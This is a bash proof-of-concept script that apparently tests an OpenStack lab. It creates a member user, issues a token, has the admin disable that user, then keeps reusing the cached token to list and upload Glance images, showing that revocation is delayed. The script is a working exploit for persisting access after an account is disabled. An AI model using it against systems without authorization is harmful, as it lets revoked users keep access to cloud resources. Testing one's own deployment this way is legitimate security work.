#!/bin/bash
echo "=== 5-MINUTE PERSISTENCE ATTACK (Fixed) ==="
echo "Exploiting token cache delay after user disable"
echo ""

source /etc/kolla/admin-openrc.sh

echo "[1] Creating attacker with MEMBER role..."
openstack user create --password attack123 persist-attack --domain default
openstack role add --user persist-attack --project admin member
echo "Attacker created"
echo ""

echo "[2] Attacker authenticates and saves token..."
cat > /tmp/attacker-creds.sh << 'CREDS'
export OS_USERNAME=persist-attack
export OS_PASSWORD=attack123
export OS_PROJECT_NAME=admin
export OS_USER_DOMAIN_NAME=Default
export OS_PROJECT_DOMAIN_NAME=Default
export OS_IDENTITY_API_VERSION=3
export OS_AUTH_URL=http://192.168.100.11:5000
CREDS

source /tmp/attacker-creds.sh
ATTACK_TOKEN=$(openstack token issue -f value -c id)
echo "Token: ${ATTACK_TOKEN:0:30}..."
echo "Token obtained at: $(date '+%T')"
echo ""

# CRITICAL: Stay as attacker, don't switch back to admin
echo "[3] Testing Glance access BEFORE disable..."
BEFORE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Auth-Token: $ATTACK_TOKEN" \
    http://192.168.100.11:9292/v2/images)
echo "Glance response: $BEFORE"
echo ""

echo "[4] In another terminal, admin disables user..."
echo ""
echo "Run this command NOW in another terminal:"
echo "  source /etc/kolla/admin-openrc.sh"
echo "  openstack user set --disable persist-attack"
echo ""
read -p "Press ENTER after you've disabled the user..."

DISABLE_TIME=$(date '+%s')
echo "Monitoring started at: $(date '+%T')"
echo ""

IMAGES_UPLOADED=0
ATTEMPTS=0

# Create test image
dd if=/dev/zero of=/tmp/malicious.img bs=1M count=1 2>/dev/null

echo "--- Attempting to upload images with disabled user's token ---"
while [ $(( $(date '+%s') - DISABLE_TIME )) -lt 330 ]; do
    ELAPSED=$(( $(date '+%s') - DISABLE_TIME ))
    ATTEMPTS=$((ATTEMPTS + 1))
    
    echo ""
    echo "[Attempt $ATTEMPTS - ${ELAPSED}s after disable]"
    
    # Test Glance API
    LIST_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "X-Auth-Token: $ATTACK_TOKEN" \
        http://192.168.100.11:9292/v2/images)
    
    echo "  Glance API: $LIST_CODE"
    
    if [ "$LIST_CODE" = "200" ]; then
        echo "  ALERT: Still accessible! Uploading image..."
        
        # Create image
        IMAGE_NAME="malicious-${ELAPSED}s"
        RESULT=$(curl -s -w "\nHTTP:%{http_code}" \
            -H "X-Auth-Token: $ATTACK_TOKEN" \
            -H "Content-Type: application/json" \
            -X POST http://192.168.100.11:9292/v2/images \
            -d "{\"name\": \"$IMAGE_NAME\", \"disk_format\": \"raw\", \"container_format\": \"bare\"}")
        
        CODE=$(echo "$RESULT" | grep HTTP: | cut -d: -f2)
        if [ "$CODE" = "201" ]; then
            echo "  SUCCESS: Image uploaded: $IMAGE_NAME"
            IMAGES_UPLOADED=$((IMAGES_UPLOADED + 1))
        fi
        
        sleep 45
    elif [ "$LIST_CODE" = "401" ]; then
        echo "  Token invalidated"
        break
    fi
done

DURATION=$(( $(date '+%s') - DISABLE_TIME ))

echo ""
echo "========================================="
echo "Attack duration: ${DURATION}s"
echo "Images uploaded: $IMAGES_UPLOADED"
echo "========================================="

if [ $IMAGES_UPLOADED -gt 0 ]; then
    echo ""
    echo "VULNERABILITY CONFIRMED!"
    echo "Disabled user uploaded $IMAGES_UPLOADED images"
fi

rm -f /tmp/malicious.img /tmp/attacker-creds.sh
